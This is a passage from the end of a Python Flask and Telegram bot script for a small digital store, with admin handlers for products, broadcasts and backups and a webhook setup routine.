            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            try:
                if p: p["position"] = int(message.text); save_db()
            except ValueError: pass
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return

        if state == "ADM_ADD_PROD_NAME" and message.text:
            pid = str(len(r.get("products", [])) + 1)
            r["products"].append({"id": pid, "name": message.text, "desc": "", "videos": [], "link": "", "position": len(r.get("products", [])) + 1, "pay_msg": ""})
            save_db(); user_states[uid] = f"ADM_ADD_PROD_LINK_{pid}"
            update_admin_panel(uid, f"✅ `{message.text}` created. Send LINK:",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu")))
            return
        if state.startswith("ADM_ADD_PROD_LINK_") and message.text:
            pid = state.replace("ADM_ADD_PROD_LINK_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["link"] = message.text; save_db()
            user_states[uid] = f"ADM_ADD_PROD_DESC_{pid}"
            update_admin_panel(uid, "✅ Link saved. Send DESC (or /skip):",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu")))
            return
        if state.startswith("ADM_ADD_PROD_DESC_") and message.text:
            pid = state.replace("ADM_ADD_PROD_DESC_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["desc"] = "" if message.text.strip() == "/skip" else message.text; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return

        if state == "ADM_SET_WELCOME" and message.text:
            r["welcome_msg"] = message.text; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return
        if state == "ADM_SET_HOW_VID" and message.content_type == 'video':
            r["how_to_use_video"] = message.video.file_id; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return
        if state == "ADM_SET_PAY_PHOTO" and message.content_type == 'photo':
            r["payment_photo"] = message.photo[-1].file_id; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return
        if state == "ADM_SET_PAY_MSG_TEXT" and message.text:
            r["payment_msg"] = message.text; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return

        if is_owner(uid):
            if state == "WAITING_AUTOBC_CUSTOM_TIME" and message.text:
                user_states.pop(uid, None)
                try:
                    r["auto_bc"]["interval_seconds"] = max(int(message.text.strip()), 5)
                    save_db()
                    iv = r["auto_bc"]["interval_seconds"]
                    ivt = f"{iv}s" if iv < 60 else (f"{iv//60}m" if iv < 3600 else f"{iv//3600}h")
                    update_admin_panel(uid, f"✅ Timer: `{ivt}`",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Auto BC", callback_data="adm_autobc_menu")))
                except ValueError:
                    update_admin_panel(uid, "❌ Invalid.",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Auto BC", callback_data="adm_autobc_menu")))
                return
            if state == "WAITING_CUSTOM_BROADCAST":
                user_states.pop(uid, None)
                update_admin_panel(uid, "🚀 Sending...", None)
                ok, fail = do_global_broadcast(message)
                update_admin_panel(uid, f"✅ Global BC\nSent: {ok}\nFailed: {fail}",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel")))
                return
            if state == "WAITING_BUYERS_BROADCAST":
                user_states.pop(uid, None)
                update_admin_panel(uid, "👑 Sending...", None)
                ok = fail = 0; seen = set()
                for b in r.get("buyers", []):
                    if b.get("user_id") in seen or b.get("user_id") in r.get("blocked_users", []): continue
                    seen.add(b.get("user_id"))
                    try:
                        if message.content_type == 'text': bot.send_message(b["user_id"], message.text)
                        elif message.content_type == 'photo': bot.send_photo(b["user_id"], message.photo[-1].file_id, caption=message.caption)
                        elif message.content_type == 'video': bot.send_video(b["user_id"], message.video.file_id, caption=message.caption)
                        elif message.content_type == 'document': bot.send_document(b["user_id"], message.document.file_id, caption=message.caption)
                        ok += 1
                    except Exception: fail += 1
                update_admin_panel(uid, f"✅ Sent: {ok} | Fail: {fail}",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel")))
                return
        if state == "WAITING_RESTORE_CODE" and message.text:
            try:
                DB_STATE.update(json.loads(message.text)); save_db(); user_states.pop(uid, None)
                update_admin_panel(uid, "✅ Restored.",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_backup_menu")))
            except Exception as e:
                update_admin_panel(uid, f"❌ Invalid JSON: {e}",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_backup_menu")))
            return

@app.route('/')
def home():
    return "Bot is running via Webhook!"

@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        update = telebot.types.Update.de_json(request.get_data().decode('utf-8'))
        bot.process_new_updates([update])
        return "!", 200
    return "Invalid message", 403

@app.route('/<path:any_path>', methods=['POST'])
def webhook_fallback(any_path):
    return "Ignored", 200

if __name__ == "__main__":
    for old_t in OLD_TOKENS:
        try:
            r = requests.get(f"https://api.telegram.org/bot{old_t}/deleteWebhook?drop_pending_updates=true", timeout=10)
            print(f"🧹 Old token cleanup: {old_t[:15]}... → HTTP {r.status_code}")
        except Exception as e:
            print(f"⚠️ {e}")
    time.sleep(2)
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=f"{RENDER_URL}/{TOKEN}")
        print(f"✅ Webhook set: {RENDER_URL}/{TOKEN[:15]}...")
    except Exception as e:
        print(f"⚠️ Webhook error: {e}")
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
